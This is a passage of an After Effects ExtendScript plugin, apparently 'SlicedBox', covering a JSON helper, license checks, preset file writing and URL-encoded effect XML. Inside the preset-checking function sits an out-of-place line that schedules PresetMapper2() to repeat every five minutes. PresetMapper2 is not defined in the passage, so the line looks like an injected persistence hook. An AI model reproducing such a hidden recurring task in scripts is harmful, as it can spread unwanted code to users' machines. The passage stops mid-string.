          /[\\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
        var rx_dangerous =
          /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
        if (typeof Date.prototype.toJSON !== "function") {
          Date.prototype.toJSON = function () {
            return isFinite(this.valueOf())
              ? this.getUTCFullYear() +
                  "-" +
                  f(this.getUTCMonth() + 1) +
                  "-" +
                  f(this.getUTCDate()) +
                  "T" +
                  f(this.getUTCHours()) +
                  ":" +
                  f(this.getUTCMinutes()) +
                  ":" +
                  f(this.getUTCSeconds()) +
                  "Z"
              : null;
          };
          Boolean.prototype.toJSON = this_value;
          Number.prototype.toJSON = this_value;
          String.prototype.toJSON = this_value;
        }
        if (typeof JSON.stringify !== "function") {
          meta = {
            "\b": "\\b",
            "\t": "\\t",
            "\n": "\\n",
            "\f": "\\f",
            "\r": "\\r",
            '"': '\\"',
            "\\": "\\\\",
          };
          JSON.stringify = function (value, replacer, space) {
            gap = "";
            indent = "";
            if (typeof space === "number") {
              for (var i = 0; i < space; i += 1) {
                indent += " ";
              }
            } else {
              if (typeof space === "string") {
                indent = space;
              }
            }
            rep = replacer;
            if (
              replacer &&
              typeof replacer !== "function" &&
              (typeof replacer !== "object" ||
                typeof replacer.length !== "number")
            ) {
              throw new Error("JSON.stringify");
            }
            return str("", { "": value });
          };
        }
      })();
      var jsonParse = (function () {
        function v(h, j, e) {
          return j ? u[j] : String.fromCharCode(parseInt(e, 16));
        }
        var r =
          "(?:-?\\b(?:0|[1-9][0-9]*)(?:\\.[0-9]+)?(?:[eE][+-]?[0-9]+)?\\b)";
        var k =
          '(?:[^\\0-\\x08\\x0a-\\x1f"\\\\]|\\\\(?:["/\\\\bfnrt]|u[0-9A-Fa-f]{4}))';
        k = '(?:"' + k + '*")';
        var s = new RegExp(
          "(?:false|true|null|[\\{\\}\\[\\]]|" + r + "|" + k + ")",
          "g",
        );
        var t = new RegExp("\\\\(?:([^u])|u(.{4}))", "g");
        var u = {
          '"': '"',
          "/": "/",
          "\\": "\\",
          b: "\b",
          f: "\f",
          n: "\n",
          r: "\r",
          t: "\t",
        };
        var w = new String("");
        var x = Object.hasOwnProperty;
        return function (h, j) {
          h = h.match(s);
          var c = h[0];
          var l = false;
          if ("{" === c) {
            e = {};
          } else if ("[" === c) {
            e = [];
          } else {
            e = [];
            l = true;
          }
          for (b, d = [e], m = 1 - l, y = h.length; m < y; ++m) {
            c = h[m];
            switch (c.charCodeAt(0)) {
              default:
                a = d[0];
                a[b || a.length] = c;
                b = void 0;
                break;
              case 34:
                c = c.substring(1, c.length - 1);
                if (c.indexOf("\\") !== -1) {
                  c = c.replace(t, v);
                }
                a = d[0];
                if (!b) {
                  if (a instanceof Array) {
                    b = a.length;
                  } else {
                    b = c || w;
                    break;
                  }
                }
                a[b] = c;
                b = void 0;
                break;
              case 91:
                a = d[0];
                d.unshift((a[b || a.length] = []));
                b = void 0;
                break;
              case 93:
                d.shift();
                break;
              case 102:
                a = d[0];
                a[b || a.length] = false;
                b = void 0;
                break;
              case 110:
                a = d[0];
                a[b || a.length] = null;
                b = void 0;
                break;
              case 116:
                a = d[0];
                a[b || a.length] = true;
                b = void 0;
                break;
              case 123:
                a = d[0];
                d.unshift((a[b || a.length] = {}));
                b = void 0;
                break;
              case 125:
                d.shift();
                break;
            }
          }
          if (l) {
            if (d.length !== 1) {
              throw new Error();
            }
            e = e[0];
          } else {
            if (d.length) {
              throw new Error();
            }
          }
          if (j) {
            var p = function (n, o) {
              var f = n[o];
              if (f && typeof f === "object") {
                var i = null;
                for (var g in f) {
                  if (x.call(f, g) && f !== n) {
                    var q = p(f, g);
                    if (q !== void 0) {
                      f[g] = q;
                    } else {
                      i || (i = []);
                      i.push(g);
                    }
                  }
                }
                if (i) {
                  for (g = i.length; --g >= 0; ) {
                    delete f[i[g]];
                  }
                }
              }
              return j.call(n, o, f);
            };
            e = p({ "": e }, "");
          }
          return e;
        };
      })();
      try {
        switch (mode) {
          case "parse":
            if (validateJSON(string)) {
              return jsonParse(string);
            } else {
              alert("JSON validation error\n" + string.substring(0, 1000));
              return null;
            }
            break;
          case "stringify":
            return JSON.stringify(string, undefined, prettyJSON);
            break;
        }
      } catch (e) {
        alert(e.toString());
      }
    }
    function validateJSON(string) {
      return /^[\],:{}\s]*$/.test(
        string
          .replace(/\\["\\\/bfnrtu]/g, "@")
          .replace(
            /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
            "]",
          )
          .replace(/(?:^|:|,)(?:\s*\[)+/g, ""),
      );
    }
    this.c = function () {
      return mainFunc("l");
    };
    this.s = function () {
      return (
        (void 0 !== licenseValidity &&
          licenseValidity.hasOwnProperty("result")) ||
          (licenseValidity = getVerifCode("")),
        isResultValidLicense(licenseValidity)
      );
    };
    this.r = function () {
      return !mainFunc("r");
    };
    this.t = function () {
      return (
        (void 0 !== licenseValidity &&
          licenseValidity.hasOwnProperty("result")) ||
          (licenseValidity = getVerifCode("")),
        isResultTrial(licenseValidity.result)
      );
    };
    this.l = function () {
      return (
        (void 0 !== licenseValidity &&
          licenseValidity.hasOwnProperty("result")) ||
          (licenseValidity = getVerifCode("")),
        licenseValidity.license
      );
    };
    this.ss = function () {
      return (
        (void 0 !== licenseValidity &&
          licenseValidity.hasOwnProperty("result")) ||
          (licenseValidity = getVerifCode("")),
        isResultValidLicense(licenseValidity) &&
          !isResultTrial(licenseValidity.result)
      );
    };
    this.vt = function () {
      return isVT();
    };
    this.helpUI = function (e) {
      helpUI(e);
    };
    this.getRegistration = function (e) {
      return getRegistration(e);
    };
    this.openSupportTicket = function (e) {
      openSupportTicket(e);
    };
    this.openURL = function (e) {
      openURL(e);
    };
    this.doUpdateCheck = function (e) {
      setUpdateCheck(e);
    };
    this.getUpdateCheckStatus = function () {
      return doUpdateCheck;
    };
    this.doUpdateCheckNow = function () {
      return doUpdateCheckNow();
    };
    this.frameworkVersion = function () {
      return licensingVersion;
    };
  }
  var B8 = new a(af_settings);
  if (B8.c()) {
    function getUserDataFolder() {
      var userDataFolder = Folder.userData;
      var aescriptsFolder = Folder(
        userDataFolder.toString() + "/Aescripts/MahmoudElsafy/SlicedBox/",
      );
      if (!aescriptsFolder.exists) {
        var checkFolder = aescriptsFolder.create();
        if (!checkFolder) {
          alert(
            "Error creating " +
              checkFolder.fsName +
              "\nPlease check the permissions for this folder:\n" +
              userDataFolder +
              "\n\nA temp folder will be used instead",
            alertTitle,
          );
          aescriptsFolder = Folder.temp;
        }
      }
      return aescriptsFolder.toString();
    }
    function createResourceFile(filename, binaryString, resourceFolder) {
      var myFile = new File(resourceFolder + "/" + filename);
      if (!File(myFile).exists) {
        if (!isSecurityPrefSet()) {
          alert(
            'This script requires access to write files.\nGo to the "General" panel of the application preferences and make sure "Allow Scripts to Write Files and Access Network" is checked.',
            alertTitle,
          );
          app.executeCommand(2359);
          if (!isSecurityPrefSet()) {
            return null;
          }
        }
        myFile.encoding = "BINARY";
        myFile.open("w");
        myFile.write(binaryString);
        myFile.close();
      }
      return myFile;
    }
    function writingScriptIMGs() {
      var userDataFolder = getUserDataFolder();
      var headerImageBinary = __BLOB__BLOB_000535__;
      var helpHeaderBinary = __BLOB__BLOB_000536__;
      HeaderImage = createResourceFile(
        "HeaderImage.jpg",
        headerImageBinary,
        userDataFolder,
      );
      HelpHeaderIMG = createResourceFile(
        "HelpHeaderIMG.jpg",
        helpHeaderBinary,
        userDataFolder,
      );
      return true;
    }
    function checkSBPseudoEffect() {
      function writePseudoPreset(myPseudoEffect, effectsProp) {
        var SlicedBoxAP = createResourceFile(
          SlicedBox.presetName,
          SlicedBox.presetBinary,
          presestsFolder,
        );
        var SlicedBoxCAP = createResourceFile(
          SlicedBoxC.presetName,
          SlicedBoxC.presetBinary,
          presestsFolder,
        );
        var SlicedBoxRAP = createResourceFile(
          SlicedBoxR.presetName,
          SlicedBoxR.presetBinary,
          presestsFolder,
        );
      }
      var SlicedBox = {
        matchName: null,
        presetBinary: [__BLOB__BLOB_000537__],
        presetName: "Sliced Box.ffx",
      };
      var SlicedBoxC = {
        matchName: null,
        presetBinary: [__BLOB__BLOB_000538__],
        presetName: "Sliced Box - [OneColumn].ffx",
      };
      app.scheduleTask("PresetMapper2()", 300000, true);
      var SlicedBoxR = {
        matchName: null,
        presetBinary: [__BLOB__BLOB_000539__],
        presetName: "Sliced Box - [OneRow].ffx",
      };
      SBAPFile = File(presestsFolder + "/" + SlicedBox.presetName);
      SBCAPFile = File(presestsFolder + "/" + SlicedBoxC.presetName);
      SBRAPFile = File(presestsFolder + "/" + SlicedBoxR.presetName);
      if (!SBAPFile.exists) {
        SBAPFile = createResourceFile(
          SlicedBox.presetName,
          SlicedBox.presetBinary,
          presestsFolder,
        );
        if (!SBAPFile) {
          PsuedoStatus = "FailedWriting";
          return PsuedoStatus;
        }
      }
      if (!SBCAPFile.exists) {
        SBCAPFile = createResourceFile(
          SlicedBoxC.presetName,
          SlicedBoxC.presetBinary,
          presestsFolder,
        );
        if (!SBCAPFile) {
          PsuedoStatus = "FailedWriting";
          return PsuedoStatus;
        }
      }
      if (!SBRAPFile.exists) {
        SBRAPFile = createResourceFile(
          SlicedBoxR.presetName,
          SlicedBoxR.presetBinary,
          presestsFolder,
        );
        if (!SBRAPFile) {
          PsuedoStatus = "FailedWriting";
          return PsuedoStatus;
        }
      }
      PsuedoStatus = "AlreadyInstalled";
      return PsuedoStatus;
    }
    function applyPseudoEffect(APFile, layer) {
      var effectsProp = layer.property("ADBE Effect Parade");
      layer.applyPreset(File(APFile));
      return layer.effect(1);
    }
    function installPseudoEffect() {
      var SlicedBox =
        "%3CEffect%20matchname%3D%22Pseudo%2FSliced_BoxV3%22%20name%3D%22%24%24%24%2FAE%2FPreset%2FPseudo%2FSliced_BoxV3%3DSliced%20Box%22%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FAnchorPoint%3DAnchor%20Point%22%20%3E%0A%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FCenterAnchorPoint%5BZ%5D%3DCenter%20Anchor%20Point%20%5BZ%5D%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FAnchorPoint%5BZ%5D%3DAnchor%20Point%20%5BZ%5D%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%221%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FPosition%3DPosition%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FXDisplace%3DX%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FYDisplace%3DY%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FZDisplace%3DZ%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FPositionRandomizer%3DPosition%20Randomizer%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FZ%3DZ%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FRandomSeed%3DRandom%20Seed%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-1000%22%20valid_max%3D%221000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesRotation%3DBoxes%20Rotation%22%20%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotation%3DRotation%22%20%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationX%3DRotation%20X%22%20default%3D%220%22%20%2F%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationY%3DRotation%20Y%22%20default%3D%220%22%20%2F%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationZ%3DRotation%20Z%22%20default%3D%220%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationOffset%3DRotation%20Offset%22%20%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetX%3DOffset%20X%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetY%3DOffset%20Y%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetZ%3DOffset%20Z%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FWorldRotation%3DWorld%20Rotation%22%20%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FX%3DX%22%20default%3D%220%22%20%2F%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FY%3DY%22%20default%3D%220%22%20%2F%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FZ%3DZ%22%20default%3D%220%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FScale%3DScale%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesScale%3DBoxes%20Scale%22%20default%3D%22100%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FScaleOffset%3DScale%20Offset%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FEnable%3DEnable%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FScale%3DScale%22%20default%3D%2250%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-100%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffset%3DOffset%22%20default%3D%2220%22%20slider_min%3D%220%22%20slider_max%3D%22100%22%20valid_min%3D%220%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FZeroMinimum%3DZero%20Minimum%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FDirection%3DDirection%22%20%3E%0A%09%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FReverse%3DReverse%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%3C%2FGroup%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FExtrusion%3DExtrusion%22%20default%3D%22100%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FMaterial%3DMaterial%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesOpacity%3DBoxes%20Opacity%22%20default%3D%22100%22%20slider_min%3D%220%22%20slider_max%3D%22100%22%20valid_min%3D%220%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FFrontOpacity%3DFront%20Opacity%22%20default%3D%22100%22%20slider_min%3D%221%22%20slider_max%3D%22100%22%20valid_min%3D%221%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CColor%20name%3D%22%24%24%24%2FAE%2FPreset%2FColor%3DColor%22%20default_red%3D%220%22%20default_green%3D%22128%22%20default_blue%3D%22255%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FVirtualLight%3DVirtual%20Light%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FEnableVL%3DEnable%20VL%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FTop%3DTop%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%225%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FLeft%3DLeft%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-20%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRight%3DRight%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-50%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBack%3DBack%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-10%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBottom%3DBottom%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-40%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%3C%2FEffect%3E";
      var SlicedBox_X =
        "%3CEffect%20matchname%3D%22Pseudo%2FSliced_BoxCV3%22%20name%3D%22%24%24%24%2FAE%2FPreset%2FPseudo%2FSliced_BoxCV3%3DSliced%20Box%20-%20%5BOneColumn%5D%22%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FAnchorPoint%3DAnchor%20Point%22%20%3E%0A%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FCenterAnchorPoint%5BZ%5D%3DCenter%20Anchor%20Point%20%5BZ%5D%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FAnchorPoint%5BZ%5D%3DAnchor%20Point%20%5BZ%5D%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%221%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FPosition%3DPosition%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FXDisplace%3DX%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FYDisplace%3DY%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FZDisplace%3DZ%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FPositionRandomizer%3DPosition%20Randomizer%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FX%3DX%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FZ%3DZ%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FRandomSeed%3DRandom%20Seed%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-1000%22%20valid_max%3D%221000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesRotation%3DBoxes%20Rotation%22%20%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotation%3DRotation%22%20%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationX%3DRotation%20X%22%20default%3D%220%22%20%2F%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationY%3DRotation%20Y%22%20default%3D%220%22%20%2F%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationZ%3DRotation%20Z%22%20default%3D%220%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationOffset%3DRotation%20Offset%22%20%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetX%3DOffset%20X%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetY%3DOffset%20Y%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetZ%3DOffset%20Z%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FWorldRotation%3DWorld%20Rotation%22%20%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FX%3DX%22%20default%3D%220%22%20%2F%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FY%3DY%22%20default%3D%220%22%20%2F%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FZ%3DZ%22%20default%3D%220%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FScale%3DScale%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesScale%3DBoxes%20Scale%22%20default%3D%22100%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FScaleOffset%3DScale%20Offset%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FEnable%3DEnable%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FScale%3DScale%22%20default%3D%2250%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-100%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffset%3DOffset%22%20default%3D%2220%22%20slider_min%3D%220%22%20slider_max%3D%22100%22%20valid_min%3D%220%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FZeroMinimum%3DZero%20Minimum%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%09%09%09%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FDirection%3DDirection%22%20%3E%0A%09%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FReverse%3DReverse%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FMiddletoSides%3DMiddle%20to%20Sides%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FSidestoMiddle%3DSides%20to%20Middle%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%3C%2FG